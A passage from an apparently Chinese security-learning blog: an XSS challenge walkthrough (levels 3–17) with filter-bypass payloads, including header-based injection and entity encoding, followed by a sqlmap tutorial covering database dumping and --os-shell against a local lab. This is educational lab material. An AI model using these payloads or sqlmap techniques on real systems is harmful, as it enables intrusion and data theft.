data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-39-42.png" alt="页面源码" class="lazyload"><br>发现alert后边的单引号没有闭合，我们在语句中加上单引号来闭合</p>
<figure class="highlight plaintext"><figcaption><span>onclick</span></figcaption><table><tr><td class="code"><pre><code class="hljs '">![成功绕过](xss-challenges学习/2023-03-27-12-42-44.png)<br>**法2**<br>在这里我们也可以使用注释方法注释掉后边的单引号内容<br>写法有一下三种<br><br>```js<br>1  &#x27; onclick=alert(1) //haha<br>2  &#x27; onclick=alert(1) &lt;!-haha<br>3  &#x27; onclick=alert(1) /*haha*/<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-55-27.png" alt="注释绕过" class="lazyload"><br>这里也可以使用鼠标移动事件<code>&#39; onmouseover=alert(1) //</code></p>
<h3 id="level-4学习"><a href="#level-4学习" class="headerlink" title="level 4学习"></a>level 4学习</h3><p><strong>补充知识</strong><br>str_replace()函数以其他字符替换字符串中的一些字符（区分大小写）<br>str_ireplace()函数执行不区分大小写的搜索<br>首先查看靶场和源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-20-34.png" alt="查看靶场详细" class="lazyload"><br>查看源码我们发现不仅使用了htmlspecialchars函数，并且使用str_replace()函数将左右尖括号替换为空。同样在这里不能使用尖括号，使用<code>onclick=alert(1)</code>尝试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-24-19.png" alt="尝试语句" class="lazyload"><br>分析可知使用双引号将前面的value进行闭合，再注释掉后面的双引号，或者将双引号闭合<br><strong>法1</strong><br><code>&quot; onclick=alert(1) &quot;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-26-54.png" alt="成功" class="lazyload"><br>点击成功弹窗<br><strong>其他方法</strong><br>使用三种注释来闭合，使用鼠标移动事件来弹窗</p>
<h3 id="level-5-学习"><a href="#level-5-学习" class="headerlink" title="level 5 学习"></a>level 5 学习</h3><p><strong>补充知识</strong><br>strtolower()把所有字符转换为小写函数</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-32-43.png" alt="五关" class="lazyload"><br>通关分析代码首先将大小写统一，然后直接过滤了<code>&lt;script</code>和on关键词，这里无法在使用上述方式绕过，可没有过滤尖括号，可以使用伪协议来进行构造</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">a标签的一种写法: <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p>因此构造语句</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span>javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里需要点击才可以触发<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-40-31.png" alt="绕过成功" class="lazyload"></p>
<p>也可以直接使用iframe标签直接触发<code>&quot;&gt;&lt;iframe src=javascript:alert(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-13-42-40.png" alt="直接执行" class="lazyload"></p>
<h3 id="level-6-学习"><a href="#level-6-学习" class="headerlink" title="level 6 学习"></a>level 6 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-06-57.png" alt="第六关" class="lazyload"><br>可以从代码中看到能过滤的都过滤了，但是与第五关相比，没有对大小写进行限制，因此大小写绕过<code>&quot; &gt;&lt;a hrEF=&quot;Javascript:alert(1)&quot;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-09-40.png" alt="大小写绕过" class="lazyload"><br>同样iframe标签也可以。</p>
<h3 id="level-7-学习"><a href="#level-7-学习" class="headerlink" title="level 7 学习"></a>level 7 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-11-48.png" alt="第七关" class="lazyload"><br>查看代码得知，使用str_replace()函数将常用标签过滤了，而且做了大小写处理，这里利用双写方式绕过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a hhrefref=&quot;</span>javascscriptript:alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">Ssrcrc</span>=<span class="hljs-string">javasscriptcript:alert(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-18-17.png" alt="双写绕过" class="lazyload"><br>tips：包裹关键词的时候并不是每一个单词都要进行双写，这里一定要保留一个完整的需要被替换的词</p>
<h3 id="level-8-学习"><a href="#level-8-学习" class="headerlink" title="level 8 学习"></a>level 8 学习</h3><p><strong>补充知识</strong><br>html字符实体：html实体是一段以连字号（&amp;）开头，以分号(;)结尾的文本（字符串）实体名称对大小写敏感。它主要是为了解决一下的问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">1. 解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析为标签。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&amp;lt; 或 &amp;#60;<br>大于号这样写：&amp;gt; 或 &amp;#62;<br>2. 键盘上无法打印的符号<br>3. 连续的空格<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-25-34.png" alt="第八关" class="lazyload"><br>查看代码发现，输入的str先进行了小写转换，然后再经过一些列关键词替换，这里无法使用过滤的关键词和引号进行绕过，在这里面一共有两个输出点，第一是采用htmlspecialchars()函数实体化，第二进行了其次过滤处理，首先尝试伪协议绕过：<br><code>javascript:alert(1)</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-30-25.png" alt="尝试" class="lazyload"><br>发现确实过滤替换了，在这里尝试用html字符实体进行尝试绕过可以再在线网站<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符实体转换</a>进行转换<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-34-09.png" alt="转换" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-35-01.png" alt="成功绕过" class="lazyload"><br>同时也可以对script的任意字母进行编码，如对s进行编码从而绕过<code>java&amp;#x73;cript:alert(1)</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-37-47.png" alt="部分实体" class="lazyload"><br>也可以使用tab和回车键进行编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">javascrip&amp;#x09;t:alert(1) <br>javascrip&amp;#x0a;t:alert(1)<br></code></pre></td></tr></table></figure>

<h3 id="level-9-学习"><a href="#level-9-学习" class="headerlink" title="level 9 学习"></a>level 9 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-41-54.png" alt="第九关" class="lazyload"><br>源码：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-42-49.png" alt="源码" class="lazyload"><br>通过源码可知首先对输入的字符串进行了过滤处理，在最后一步的时候判断是否存在<code>http://</code>头，没有则判定为非法操作，因此在这里可以通过注释符的方式添加进来进行绕过即可。输入<code>javascrip&amp;#x09;t:alert(1)</code>提示连接不合法<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-48-40.png" alt="提示" class="lazyload"><br>这里可以加注释绕过<code>javascrip&amp;#x09;t:alert(1) // http://</code><br>添加http头绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-51-39.png" alt="成功弹窗" class="lazyload"></p>
<h3 id="level-10-学习"><a href="#level-10-学习" class="headerlink" title="level 10 学习"></a>level 10 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-53-09.png" alt="第十关" class="lazyload"><br>源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-14-54-07.png" alt="源码" class="lazyload"><br>通过源码分析可知需要传入两个参数一个keyword，另一个t_sort。而且过滤了尖括号，页面中还隐藏了三个元素，并且前两个将值替换为空，最后一个值是过滤了尖括号之后的结果，因此首先尝试基础语句：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-14-07.png" alt="尝试" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-18-08.png" alt="t_sort参数尝试" class="lazyload"><br>可以看到尖括号被过滤了，尝试绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">payload:<br>&quot; type=&quot;password&quot; onclick=alert(1) //<br>完整的payload：<br>keyword=hacked by crow&amp;t_sort=&quot; type=&quot;text&quot; onclick=alert(1) //<br>其中//属于必须要的注释符，可以使用其他的注释符进行替换也可<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-22-18.png" alt="成功绕过" class="lazyload"><br>也可以更换事件onmouseover事件</p>
<h3 id="level-11-学习"><a href="#level-11-学习" class="headerlink" title="level 11 学习"></a>level 11 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-24-22.png" alt="第11关" class="lazyload"><br>分析源代码，可以知道对输入的keyword和t_sort进行了关键词过滤，但是对于str11到str33过滤尖括号，先尝试一下语句看看页面的返回<br><code>keyword=hacked by crow &amp; t_sort= &lt;script&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-27-35.png" alt="查看页面响应" class="lazyload"><br>在这里看源码str11参数接受的是http_referer中的值，我们可以使用burp或者hackbr向http_referer参数中构造语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">payload1:<br>&quot; type=&#x27;text&#x27; onclick=alert(1) // <br>payload2:<br>&quot; type=&#x27;text&#x27; onmouseover=alert(1) //<br>//  tips:需要在referer中进行构造<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-37-21.png" alt="成功弹窗" class="lazyload"></p>
<h3 id="level-12-学习"><a href="#level-12-学习" class="headerlink" title="level 12 学习"></a>level 12 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-39-07.png" alt="第12关" class="lazyload"><br>同过源码分析可知与11关很像只不过将http_referer替换为了UA因此直接用hackbr等工具直接替换即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">payload1:<br>&quot; type=&#x27;text&#x27; onclick=alert(1) // <br>payload2:<br>&quot; type=&#x27;text&#x27; onmouseover=alert(1) //<br>// tips:需要在user-agent中进行构造<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-42-16.png" alt="ua中xss" class="lazyload"></p>
<h3 id="level-13-学习"><a href="#level-13-学习" class="headerlink" title="level 13 学习"></a>level 13 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-44-26.png" alt="第13关" class="lazyload"><br>经过分析可得出和11、12关一样这里只不过指定的是cookie因此构造如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">payload1:<br>&quot; type=&#x27;text&#x27; onclick=alert(1) // <br>payload2:<br>&quot; type=&#x27;text&#x27; onmouseover=alert(1) //<br><br>// tips:需要在cookies中进行构造<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-15-47-54.png" alt="cookie中" class="lazyload"></p>
<h3 id="level-14-学习"><a href="#level-14-学习" class="headerlink" title="level 14 学习"></a>level 14 学习</h3><p><strong>补充知识</strong><br>exif:可交换图像文件格式（exchangeable image file format 简称exif）是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-56-41.png" alt="事例" class="lazyload"><br>Windows下可以直接右键修改这些属性，有些网站可以读取exif信息，当传入一张含有恶意信息的图片的时候，就可以触发payload</p>
<p>14关代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;欢迎来到level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>分析代码可以看出是跳转到一个能够读取exif信息的网站，但是这个网站存在exif xss漏洞，因此可以直接触发xss，所以只要将src后面的网址进行替换到一个有这样漏洞的网站即可。</p>
<h3 id="level-15-学习"><a href="#level-15-学习" class="headerlink" title="level 15 学习"></a>level 15 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-00-56.png" alt="第15关" class="lazyload"><br>引入了angular.min.js而且使用ng-include指令包含外部html文件，包含的内容将作为指定元素的子节点。ng-include属性值可以是一个表达式，返回一个文件名，默认情况下，包含文件需要包含在同一个域名下因此可以直接构造<code>src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-07-08.png" alt="成功弹窗" class="lazyload"></p>
<h3 id="level-16-学习"><a href="#level-16-学习" class="headerlink" title="level 16 学习"></a>level 16 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-08-25.png" alt="第16关" class="lazyload"></p>
<p>从源码可以看出script等均被替换为空格符号，但是这里没有过滤尖括号，可以尝试尖括号过滤<code>&lt;img src=1 onerror=alert(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-12-04.png" alt="尝试" class="lazyload"><br>出现了新问题空格被替换为空格符号，这里尝试使用%0a来替换空格<br>当然也可以使用别的符号替换如%0d回车符号等<br><code>&lt;img%0dsrc=1 %0donerror=alert(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-14-23.png" alt="成功弹窗" class="lazyload"></p>
<h3 id="level-17-学习"><a href="#level-17-学习" class="headerlink" title="level 17 学习"></a>level 17 学习</h3><p>源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-17-44.png" alt="源码" class="lazyload"><br>通过源代码和基础的xss反弹代码发现，arg01和arg02的参数在处理之后进行了拼接<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-17-30-24.png" alt="拼接" class="lazyload"><br>而htmlspecialchars函数会将输入的数据变成html实体，过滤了尖括号和双引号，尝试其他方式绕过<code>?arg01=a&amp;arg02= onmouseover=alert(1)</code>这里在arg02参数后面有一个空格，不然就是将属性与之前的xsf01.swf?进行了连接但是这里由于插件不支持无法演示18、19、20关</p>
<h2 id="后续推荐学习"><a href="#后续推荐学习" class="headerlink" title="后续推荐学习"></a>后续推荐学习</h2><p>推荐学习靶场haozi的靶场<a target="_blank" rel="noopener" href="https://github.com/haozi/xss-demo">https://github.com/haozi/xss-demo</a></p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="sqlmap使用教程" class="lazyload">
                    <h1>sqlmap使用教程</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月26日</a>
            <a><i class="nexmoefont icon-areachart"></i>2.8k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 11 分钟</a>
        </div>

        <article>
            
                <h2 id="SQLmap简介"><a href="#SQLmap简介" class="headerlink" title="SQLmap简介"></a>SQLmap简介</h2><p>sqlmap是一个开源渗透测试工具，可以用来进行自动化检测，利用sql注入漏洞获取数据库服务器的权限。它具有强大的检测引擎，针对各种不同类型的数据库的渗透测试功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接方式操作系统命令。<br>它支持五种注入模式：</p>
<ol>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句结果直接返回在页面中</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>对查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<p>sqlmap是一个跨屏台的工具，很好用，是sql注入的强大工具。</p>
<h2 id="sqlmap的安装"><a href="#sqlmap的安装" class="headerlink" title="sqlmap的安装"></a>sqlmap的安装</h2><p>首先它是基于python的首先需要在电脑中安装好python环境然后到sqlmap官网<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a>下载和python环境相匹配的版本的压缩包，然后解压到python安装的文件下通过命令行启动即可。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-42-27.png" alt="解压位置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-43-35.png" alt="启动" class="lazyload"></p>
<h2 id="sqlmap使用参数详解"><a href="#sqlmap使用参数详解" class="headerlink" title="sqlmap使用参数详解"></a>sqlmap使用参数详解</h2><p>在这里我们使用自己虚拟机搭建的sqli-labs靶场作为演示来学习使用sqlmap。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-49-17.png" alt="靶场" class="lazyload"></p>
<p><strong>选项</strong><br>一些参数选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">-h,--help显示本地帮助信息并退出<br>-hh 显示高级帮助信息并退出<br>--version 显示程序版本信息并退出<br>-v 数字 :信息级别：0-6（1缺省），具体含义为<br>    0只显示python错误以及严重的信息<br>    1同时显示基本信息和警告信息（默认）<br>    2同时显示debug信息<br>    3同时显示注入的payload信息<br>    4同时显示http请求<br>    5同时显示http响应头<br>    6同时显示http响应页面<br>    如果想看到sqlmap发送的payload最好的等级为3<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-27-36.png" alt="查看版本新信息" class="lazyload"><br><strong>目标</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">-d direct 直接连接数据库的连接字符串 如：python sqlmap.py -d &quot;mysql://root:root@192.168.23.128:3306/security&quot; 需要有python-pymysql这个库<br><br>-u url ,--url=url 目标url<br>-p 指定注入参数<br>-l logfile 从不让拍或者webscarab代理日志文件中分析目标<br>-x sitemapurl 从远程网站地图sitemap.xml文件来解析<br>-m BULKFILE 将目标地址保存在文件中，一行为一个url地址进行批量检测<br>-r REQUESTFILE 从文件中加载http请求，sqlmap可以从一个文件中获取http请求，这样就可以跳过设置一些其他参数如cookie、post数据等等，请求是https的时需要配合--force-ssl参数来使用，或者可以在host头后加443<br>-g GOOGLEDORK 从谷歌中加载结果目标url（只获取前100个结果，需要魔法）<br>-c configfile 从配置ini文件中加载选项<br></code></pre></td></tr></table></figure>

<p>使用-d尝试连接<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-36-12.png" alt="连接数据库" class="lazyload"></p>
<p>使用-u参数尝试<br>sqlmap.py -u 选项对于不常使用的网站可以直接使用 -u参数指定url地址探测是否存在注入<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-03-03.png" alt="扫描" class="lazyload"><br>也可以直接添加–batch省区询问直接选择默认项<br>扫描出id存在boolean盲注，并且给出结果mysql版本和服务器类型和php版本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-09-41.png" alt="出现boolean盲注" class="lazyload"></p>
<p>使用-r指定文件从文件中加载目标<br>sqlmap.py -r 文件路径 使用该命令时必须指明文件的绝对路径，验证过程与-u参数类似，判断可注入的参数，判断那种sql注入进行注入<br>可以使用-p参数来指定注入点，使用–skip参数来跳过注入点，也可以使用*来表注注入点，星号添加位置是你认为可能存在的注入点<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-16-54-00.png" alt="数据包" class="lazyload"><br>保存为txt用sqlmap跑<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-16-59-01.png" alt="星号指定注入点" class="lazyload"></p>
<p><strong>获取信息</strong><br>–current-db获取当前数据库名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-14-30.png" alt="获取当前数据库名" class="lazyload"><br>–dbs是获取数据库（暴库）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-02-32.png" alt="获取数据库" class="lazyload"><br>-D指定数据库名 –tables参数是获取数据库中的表(暴表)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-08-58.png" alt="指定库名暴表名" class="lazyload"><br>-T指定表名 –columns参数是获取数据库表中的字段名(暴字段)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-11-34.png" alt="指定表名暴字段" class="lazyload"><br>-C指定字段名用,分隔 –dump参数获取字段的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-33-32.png" alt="获取指定字段值" class="lazyload"><br>–start指定开始行 –stop指定结束行指定第几行到第几行的数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-09-23.png" alt="获取指定行数据" class="lazyload"><br>–dump-all获取数据库中所有数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-39-02.png" alt="获取所有数据" class="lazyload"></p>
<p><strong>其他命令</strong><br>level是测试等级一共有五个级别，级别越高检测内容越多，级别大于等于2时会检测cookie是否含有注入，大于等于3时会检测user-angent和referer是否有注入。推荐使用3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txet">--level 5：探测等级<br><br>探测等级随着等级的变高探测的东西会更更多，不加命令默认探测等级为1，最高为5,。并且随着探测等级越来越高，所需要花费的时间会更多<br><br>--level 共有五个等级，sqlmap使用的payload可以在xml/payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。<br><br>level&gt;=2的时候就会测试HTTP Cookie。<br><br>level&gt;=3的时候就会测试HTTP User-Agent/Referer头。<br><br>level=5 的时候会测试HTTP Host<br><br>为了保证全面性建议使用更高的探测等级进行他探测<br></code></pre></td></tr></table></figure>

<hr>
<p>–risk=RISK 执行测试的风险（0-3，默认为1）<br>risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试<br>升高风险等级会增加数据被篡改的风险。 常用就是默认1</p>
<hr>
<p>os是检测数据库版信息的一个命令，但sqlmap默认会自动检测,–os-shell当数据库为mysql、postgresql或sqlserver时可以通过sqlmap执行操作系统命令</p>
<p>当数据库是mysql时满足当前用户为root知道网站根目录<br><code>sqlmap -u &quot;xxx&quot; --os-shell</code><br>会让我们选择网站脚本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-48-42.png" alt="选脚本" class="lazyload"><br>接下来让我们判断网站可写目录的方法<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-50-12.png" alt="可写目录的方法" class="lazyload"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">【1】使用公共的默认目录(C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)<br>【2】自定义网络根目录绝对路径<br>【3】指定自定义的路径文件<br>【4】暴力破解<br></code></pre></td></tr></table></figure>

<p>执行os-shell时sqlmap会向网站根目录写入两个文件tmpblwkd.php和tmpueqch.php。真正的木马文件是前者，如果是非正常退出sqlmap的话，这两个文件不会被删除。只有当我们输入x或q退出时sqlmap才会将该文件自动删除<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-19-04-44.png" alt="命令成功执行" class="lazyload"></p>
<hr>
<p><em>用来表注注入点：sqlmap可以区分一个url中的参数来进行注入点测试，但在遇到一些做了伪静态的网页就无法自动识别了<br>类似于/admin/1，sqlmap无法进行注入测试，但实际上可能是/admin.php?id=1 只是把参数隐藏在了url中，对于这样只需要在参数后加上一个星号即可如/admin/1</em> 星号之后众生平等</p>
<hr>
